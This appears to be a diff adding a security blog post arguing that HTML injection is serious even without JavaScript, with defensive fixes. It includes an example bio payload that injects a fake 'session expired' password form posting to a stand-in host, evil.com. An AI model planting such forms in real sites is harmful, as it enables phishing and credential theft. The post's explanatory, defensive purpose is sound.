@@ -1,0 +1,206 @@
+---
+title: "On HTML Injection"
+publishedAt: "2026.05.18"
+summary: "HTML injection is often called the harmless cousin of XSS. I think that framing misses the point entirely."
+---
+# On HTML Injection
+
+HTML injection is usually treated as the less serious sibling of XSS.
+
+No JavaScript. No `document.cookie` flying out to a remote server. No `eval`. Just some rogue markup sitting in a field that should have been plain text. Security teams sometimes mark it low severity. Bug bounty platforms downgrade it. The word "injection" sounds alarming, but without script execution, people assume the worst has been avoided.
+
+I think that assumption is wrong in a specific and important way.
+
+## The Framing Problem
+
+The reason XSS feels dangerous is that it executes code. Attackers can read cookies, redirect users, make requests, log keystrokes — anything a script can do in a browser.
+
+HTML injection cannot do any of that. No script means no execution.
+
+But here is the thing: you do not need script execution to deceive someone.
+
+What you need is control over what they see inside a context they trust.
+
+That is exactly what HTML injection gives an attacker. They cannot run code in your browser. But they can add a form. They can add a heading that says "Your session has expired — please confirm your password." They can add a button that POSTs to their server. They can rearrange page structure in ways that look completely native to the site.
+
+The browser's trust model is based on origin. The URL bar says `yourbank.com`. That is what the user reads. Everything that appears within that frame inherits that trust. HTML injection lets an attacker furnish that frame however they like.
+
+## A Concrete Example
+
+Imagine a platform that renders user bios with `innerHTML` but strips `<script>` tags. The developer thinks this is safe because there is no script execution path.
+
+An attacker writes this as their bio:
+
+```html
+</div>
+<form action="https://evil.com/harvest" method="POST">
+  <p>Your session has expired. Please confirm your password to continue.</p>
+  <input type="password" name="pw" placeholder="Password">
+  <button type="submit">Confirm identity</button>
+</form>
+<div style="display:none">
+```
+
+Step one: they save it and walk away. Their job is done.
+
+Step two: the server stores the bio as-is. No escaping. That payload sits in the database like any other profile row.
+
+Step three: any user who visits that profile sees a form that looks like it belongs to the page. Same fonts, same colors, nested inside the same layout. The URL bar still shows the legitimate domain. There is no phishing warning. No suspicious redirect. No unusual behavior.
+
+Step four: the visitor types their password and hits confirm. The browser POSTs to `evil.com`. No JavaScript involved — the attacker now has their password.
+
+<svg width="100%" viewBox="0 0 680 510" role="img" xmlns="http://www.w3.org/2000/svg" fontFamily="inherit">
+  <title>How HTML injection harvests credentials without JavaScript</title>
+  <desc>Four-step flow: attacker posts HTML form payload, server stores it, visitor's browser renders injected form on trusted page, victim submits credentials to attacker</desc>
+  <defs>
+    <marker id="html-inj-arrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+      <path d="M2 1L8 5L2 9" fill="none" stroke="context-stroke" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/>
+    </marker>
+  </defs>
+
+  <text x="340" y="28" textAnchor="middle" fill="#8c95a1" fontSize="12">step 1 — attacker posts the HTML payload once</text>
+
+  <rect x="30" y="40" width="110" height="56" rx="8" fill="#fef2f2" stroke="#b33535" strokeWidth="0.5"/>
+  <text x="85" y="60" textAnchor="middle" dominantBaseline="central" fill="#7f1d1d" fontSize="14" fontWeight="500">Attacker</text>
+  <text x="85" y="78" textAnchor="middle" dominantBaseline="central" fill="#b33535" fontSize="12">posts bio</text>
+
+  <line x1="140" y1="68" x2="164" y2="68" stroke="#8c95a1" strokeWidth="1.5" markerEnd="url(#html-inj-arrow)"/>
+
+  <rect x="166" y="40" width="288" height="56" rx="8" fill="none" stroke="#b33535" strokeWidth="0.5" strokeDasharray="4 3"/>
+  <text x="182" y="59" dominantBaseline="central" fontFamily="monospace" fontSize="12" fill="#7f2828">&lt;form action="evil.com" method="POST"&gt;</text>
+  <text x="182" y="77" dominantBaseline="central" fontFamily="monospace" fontSize="12" fill="#7f2828">  &lt;input type="password" name="pw"&gt;</text>
+
+  <line x1="454" y1="68" x2="486" y2="68" stroke="#8c95a1" strokeWidth="1.5" markerEnd="url(#html-inj-arrow)"/>
+
+  <rect x="488" y="40" width="152" height="56" rx="8" fill="#ebedef" stroke="#8c95a1" strokeWidth="0.5"/>
+  <text x="564" y="60" textAnchor="middle" dominantBaseline="central" fill="#3b4149" fontSize="14" fontWeight="500">Server + DB</text>
+  <text x="564" y="78" textAnchor="middle" dominantBaseline="central" fill="#697381" fontSize="12">stores raw, no escape</text>
+
+  <line x1="30" y1="118" x2="650" y2="118" stroke="#d8dbdf" strokeWidth="0.5" strokeDasharray="4 3"/>
+  <text x="340" y="136" textAnchor="middle" fill="#8c95a1" fontSize="12">step 2 — any visitor who views the page sees a form that looks real</text>
+
+  <rect x="30" y="150" width="110" height="56" rx="8" fill="#edf7f2" stroke="#1a7a52" strokeWidth="0.5"/>
+  <text x="85" y="170" textAnchor="middle" dominantBaseline="central" fill="#0f4f3d" fontSize="14" fontWeight="500">Any visitor</text>
+  <text x="85" y="188" textAnchor="middle" dominantBaseline="central" fill="#1a7a52" fontSize="12">views profile</text>
+
+  <line x1="140" y1="178" x2="234" y2="178" stroke="#8c95a1" strokeWidth="1.5" markerEnd="url(#html-inj-arrow)"/>
+
+  <rect x="236" y="150" width="140" height="56" rx="8" fill="#ebedef" stroke="#8c95a1" strokeWidth="0.5"/>
+  <text x="306" y="170" textAnchor="middle" dominantBaseline="central" fill="#3b4149" fontSize="14" fontWeight="500">Server</text>
+  <text x="306" y="188" textAnchor="middle" dominantBaseline="central" fill="#697381" fontSize="12">fetches from DB</text>
+
+  <text x="424" y="168" textAnchor="middle" fill="#697381" fontSize="12">HTML + injected form</text>
+  <line x1="376" y1="178" x2="474" y2="178" stroke="#b33535" strokeWidth="1.5" markerEnd="url(#html-inj-arrow)"/>
+
+  <rect x="476" y="150" width="154" height="56" rx="8" fill="#edf7f2" stroke="#1a7a52" strokeWidth="0.5"/>
+  <text x="553" y="170" textAnchor="middle" dominantBaseline="central" fill="#0f4f3d" fontSize="14" fontWeight="500">Browser</text>
+  <text x="553" y="188" textAnchor="middle" dominantBaseline="central" fill="#1a7a52" fontSize="12">renders as HTML</text>
+
+  <line x1="30" y1="228" x2="650" y2="228" stroke="#d8dbdf" strokeWidth="0.5" strokeDasharray="4 3"/>
+  <text x="340" y="246" textAnchor="middle" fill="#8c95a1" fontSize="12">step 3 — victim trusts the domain and submits. no script fires.</text>
+
+  <rect x="30" y="260" width="130" height="56" rx="8" fill="#edf7f2" stroke="#1a7a52" strokeWidth="0.5"/>
+  <text x="95" y="280" textAnchor="middle" dominantBaseline="central" fill="#0f4f3d" fontSize="14" fontWeight="500">Victim</text>
+  <text x="95" y="298" textAnchor="middle" dominantBaseline="central" fill="#1a7a52" fontSize="12">types password</text>
+
+  <line x1="160" y1="288" x2="194" y2="288" stroke="#8c95a1" strokeWidth="1.5" markerEnd="url(#html-inj-arrow)"/>
+
+  <rect x="196" y="260" width="240" height="56" rx="8" fill="#fef2f2" stroke="#b33535" strokeWidth="0.5"/>
+  <text x="212" y="279" dominantBaseline="central" fontFamily="monospace" fontSize="12" fill="#7f2828">"Session expired. Confirm identity:"</text>
+  <text x="212" y="297" dominantBaseline="central" fontFamily="monospace" fontSize="12" fill="#7f2828">  ●●●●●●●● → [Submit]</text>
+
+  <line x1="436" y1="288" x2="492" y2="288" stroke="#b33535" strokeWidth="1.5" markerEnd="url(#html-inj-arrow)"/>
+
+  <rect x="494" y="260" width="146" height="56" rx="8" fill="#fef2f2" stroke="#b33535" strokeWidth="0.5"/>
+  <text x="567" y="280" textAnchor="middle" dominantBaseline="central" fill="#7f1d1d" fontSize="14" fontWeight="500">evil.com</text>
+  <text x="567" y="298" textAnchor="middle" dominantBaseline="central" fill="#b33535" fontSize="12">receives POST</text>
+
+  <line x1="30" y1="338" x2="650" y2="338" stroke="#d8dbdf" strokeWidth="0.5" strokeDasharray="4 3"/>
+  <text x="340" y="356" textAnchor="middle" fill="#8c95a1" fontSize="12">step 4 — attacker has the password. zero javascript involved.</text>
+
+  <rect x="30" y="370" width="406" height="44" rx="8" fill="none" stroke="#b33535" strokeWidth="0.5" strokeDasharray="4 3"/>
+  <text x="46" y="386" dominantBaseline="central" fontFamily="monospace" fontSize="12" fill="#7f2828">pw=hunter2&amp;submit=Confirm+identity</text>
+  <text x="46" y="404" dominantBaseline="central" fill="#697381" fontSize="12">(victim's password — sent via a plain HTML form POST, no script needed)</text>
+
+  <line x1="436" y1="392" x2="488" y2="392" stroke="#b33535" strokeWidth="1.5" markerEnd="url(#html-inj-arrow)"/>
+
+  <rect x="490" y="370" width="150" height="44" rx="8" fill="#fef2f2" stroke="#b33535" strokeWidth="0.5"/>
+  <text x="565" y="386" textAnchor="middle" dominantBaseline="central" fill="#7f1d1d" fontSize="14" fontWeight="500">Attacker</text>
+  <text x="565" y="404" textAnchor="middle" dominantBaseline="central" fill="#b33535" fontSize="12">has the password</text>
+
+  <rect x="30" y="434" width="620" height="56" rx="8" fill="#fefcf0" stroke="#9a7020" strokeWidth="0.5"/>
+  <text x="46" y="452" dominantBaseline="central" fill="#5a4010" fontSize="12" fontWeight="500">Why this works without JavaScript:</text>
+  <text x="46" y="468" dominantBaseline="central" fill="#5a4010" fontSize="12">The browser POSTs a form because that is what HTML forms do. No script needed. No CSP violation.</text>
+  <text x="46" y="482" dominantBaseline="central" fill="#5a4010" fontSize="12">The attacker just had to put a form in the right place on a page the victim already trusted.</text>
+</svg>
+
+## A Real Incident: eBay Product Listings
+
+This is not a theoretical attack path. It has recurred on real platforms.
+
+eBay allows HTML in product listing descriptions so sellers can add formatting — bold text, bullet points, embedded images. That is a reasonable product decision. But the same mechanism that allows formatting allows structure.
+
+Security researchers found repeatedly that eBay product descriptions could be used to inject forms and overlays that appeared to be part of the eBay interface. A listing page would look normal from search results, live on a legitimate eBay URL, and yet contain injected HTML that overlaid a fake "Pay Securely" button. Clicking it would not go to eBay's payment processor. It would go to an external server collecting payment details directly.
+
+Visitors who arrived through a real eBay search, on a real eBay domain, had no obvious signal that anything was wrong. The URL was right. The page looked right. The injected element was dressed to match the surrounding interface.
+
+The issue recurred across multiple years because eBay's approach was to block specific dangerous tags. Block `<script>`. Block `<iframe>`. Each fix addressed a vector, but the root cause remained: seller-controlled content was still being rendered as HTML. Another allowed tag, another allowed attribute, another variation would surface.
+
+Blocking tags is a blocklist. It fails open — anything not on the list is permitted. The fix was not a longer blocklist. It was to stop rendering listing descriptions as HTML.
+
+## Why "No Scripts" Does Not Mean "No Harm"
+
+The assumption that HTML injection is harmless without JavaScript has a specific flaw: it conflates code execution with deception.
+
+JavaScript can run code. HTML controls what the user sees. Both can be dangerous, just in different ways.
+
+A form with `action="https://evil.com"` is standard HTML. The browser handles it exactly as designed. No security policy blocks it by default. Content Security Policy governs script execution and resource loading — it does not prevent a form from POSTing wherever the form says. The browser will faithfully send the user's input to whatever URL the attacker specified.
+
+Beyond credential harvesting, HTML injection can:
+
+- Overlay fake error messages: "Your account has been suspended. Click here to verify."
+- Inject navigation elements that link off-site while looking like internal links
+- Insert hidden elements that load third-party content
+- Manipulate layout so legitimate UI is obscured by attacker-controlled UI
+
+None of these require JavaScript. The HTML structure itself is the weapon.
+
+## The Fix Is the Same
+
+The fix for HTML injection is the same as the fix for XSS: do not hand untrusted input to an HTML parser.
+
+If the field is meant to be plain text, render it as text:
+
+```js
+element.textContent = userInput
+```
+
+If the product genuinely needs rich text — bold, italic, links — the answer is not to allow arbitrary HTML. The answer is to define an explicit allowlist of safe elements and attributes, and run input through a sanitizer that enforces it. DOMPurify is the standard choice for this in the browser.
+
+The key distinction is blocklist versus allowlist.
+
+"Strip `<script>` and event handlers" is a blocklist. It fails when a new attack vector appears that the blocklist did not anticipate. "Allow only `<b>`, `<i>`, `<a href>`, `<ul>`, `<li>`" is an allowlist. It fails closed — unknown tags are rejected rather than permitted.
+
+The eBay pattern is the blocklist pattern. It failed on a loop.
+
+## The Relationship to XSS
+
+HTML injection and XSS are not two separate vulnerabilities. They are points on a spectrum.
+
+A form injected without JavaScript is HTML injection. The same form with an `onerror` handler on an image inside it is XSS. An attacker who finds HTML injection will often probe further: which attributes does the sanitizer permit? Which elements? Is there one that accepts an event handler the filter missed?
+
+This is why dismissing HTML injection as low severity can be shortsighted. HTML injection is evidence that user input reaches an HTML context unescaped. XSS is what happens when the attacker finds one more gap in whatever partial filter is in place.
+
+The real fix — rendering untrusted input as text, or sanitizing to a strict allowlist — closes both.
+
+## The Trust Is in the Domain
+
+What makes HTML injection counterintuitive is that the danger is not about what runs. It is about what appears.
+
+Users have learned to check the URL bar. They look for the padlock. They look for the right domain name. What they have not learned to distrust is the layout of a page they navigated to legitimately.
+
+When a form appears on a site they know, in the same font and color as that site, asking for something plausible — many will answer it.
+
+HTML injection gives an attacker the ability to author that form. The browser renders it faithfully. The user trusts the domain. The attacker does not need JavaScript for any of that.
+
+That is the thing "no scripts" misses. The risk was never only about execution. It was about impersonation.
